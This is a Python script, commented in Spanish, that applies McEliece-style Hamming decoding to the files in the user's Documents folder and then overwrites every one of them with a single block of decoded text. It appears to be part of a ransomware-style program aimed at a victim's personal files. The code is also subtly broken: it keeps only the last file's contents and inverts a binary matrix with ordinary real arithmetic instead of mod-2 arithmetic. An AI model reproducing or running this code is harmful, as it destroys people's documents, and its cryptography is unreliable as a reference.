import os
from os import remove
from cryptography.fernet import Fernet
import rsa
import tkinter as tk
import tkinter.simpledialog
import hashlib
import numpy as np


def matrix_to_string(matrix):
    # Convertir la matriz a un objeto ndarray de numpy
    matrix = np.array(matrix)
    # Usar array_str() para convertir la matriz a una cadena de texto
    result = np.array_str(matrix)
    return result

def resta(matrizA, matrizB):
    # Convertir las matrices a objetos ndarray de numpy
    matrizA = np.array(matrizA)
    matrizB = np.array(matrizB)
    # Usar subtract() para restar las matrices elemento a elemento
    resultado = np.subtract(matrizA, matrizB)
    # Aplicar la función abs() a cada elemento del resultado
    resultado = np.abs(resultado)
    return resultado

def multiplicacion(matrizA, matrizB):
    # Convertir las matrices a objetos ndarray de numpy
    matrizA = np.array(matrizA)
    matrizB = np.array(matrizB)
    # Usar dot() para multiplicar las matrices
    producto = np.dot(matrizA, matrizB)
    # Aplicar el módulo 2 a cada elemento del producto
    producto = producto % 2
    return producto

pcr = np.array([[0, 0, 0, 0], [0, 0, 0, 1], [0, 0, 1, 0], [0, 0, 1, 1], [0, 1, 0, 0], [0, 1, 0, 1], [0, 1, 1, 0], [0, 1, 1, 1], 
[1, 0, 0, 0], [1, 0, 0, 1], [1, 0, 1, 0], [1, 0, 1, 1], [1, 1, 0, 0], [1, 1, 0, 1], [1, 1, 1, 0], [1, 1, 1, 1]])

generadora = np.array([[1, 1, 1, 0, 0, 0, 0], [1, 0, 0, 1, 1, 0, 0], [0, 1, 0, 1, 0, 1, 0], [1, 1, 0, 1, 0, 0, 1]])

paridad = np.array([[0, 0, 0, 1, 1, 1, 1], [0, 1, 1, 0, 0, 1, 1], [1, 0, 1, 0, 1, 0, 1]])

paridad_traspuesta= np.transpose(paridad)

invertible = np.array([[1, 1, 1, 1], [1, 0, 0, 1], [1, 1, 1, 0], [0, 1, 0, 1]])

permutacion= np.array([[0, 0, 0, 0, 0, 0, 1], [0, 1, 0, 0, 0, 0, 0], [0, 0, 0, 1, 0, 0, 0], [0, 0, 1, 0, 0, 0, 0],
                        [0, 0, 0, 0, 1, 0, 0], [0, 0, 0, 0, 0, 1, 0], [1, 0, 0, 0, 0, 0, 0]])

sindrome = {
    "[0 0 0]": np.array([[0, 0, 0, 0, 0, 0, 0]]),
    "[1 1 1]": np.array([[1, 0, 0, 0, 0, 0, 0]]),
    "[1 1 0]": np.array([[0, 1, 0, 0, 0, 0, 0]]),
    "[1 0 1]": np.array([[0, 0, 1, 0, 0, 0, 0]]),
    "[1 0 0]": np.array([[0, 0, 0, 1, 0, 0, 0]]),
    "[0 1 1]": np.array([[0, 0, 0, 0, 1, 0, 0]]),
    "[0 1 0]": np.array([[0, 0, 0, 0, 0, 1, 0]]),
    "[0 0 1]": np.array([[0, 0, 0, 0, 0, 0, 1]])
}


#Abrir archivos a encriptar
usuario = [os.path.expanduser('~')+"/Documents"]

items = os.listdir(usuario[0])
archivos_2 = [usuario[0]+"/"+x for x in items]
for x in archivos_2:
    with open(x, 'r') as file:
        archivosDat=file.read()


print(archivosDat)

x = int(archivosDat, 2)
binary=[]
binary += format(x, '08b')
binary = np.array(binary, dtype=int)
print(binary)
binary = binary.reshape(-1, 7)


print(binary)


pr= np.dot(binary, permutacion)

print(pr)

sind = np.dot(pr, paridad_traspuesta)
sind = sind % 2
print(sind)

row = sind[0, :]
print(row)
representante = sindrome[matrix_to_string(row)]

print(representante)

pa = resta(pr, representante)

print(pa)

filas, columnas = np.shape(pa)

pcs=np.empty((filas, 4))


for i in range(pa.shape[0]):
    for j in range(pcr.shape[0]):
        C = np.dot(pcr[j], generadora)
        C = C % 2
        if np.allclose(C, pa[i]):
            pcs[i]=pcr[j]
            break
    

print(pcs)

S = np.linalg.inv(invertible)


print(S)
for x in range(pcs.shape[0]):
    pcs[x]=multiplicacion(pcs[x], S)
    pcs[x]=pcs[x] % 2
print(pcs)
text=""
resultado = matrix_to_string(pcs)
resultado = resultado.replace("[", "").replace("]", "").replace(".", "").replace("\n", "").replace(" ", "")
print(resultado)
for i in range(0, len(resultado), 8):
    octet = resultado[i:i+8]
    integer = int(octet, 2)
    character = chr(integer)
    text += character

for x in archivos_2:
    with open(x, 'w') as file:
        archivosDat=file.write(text)
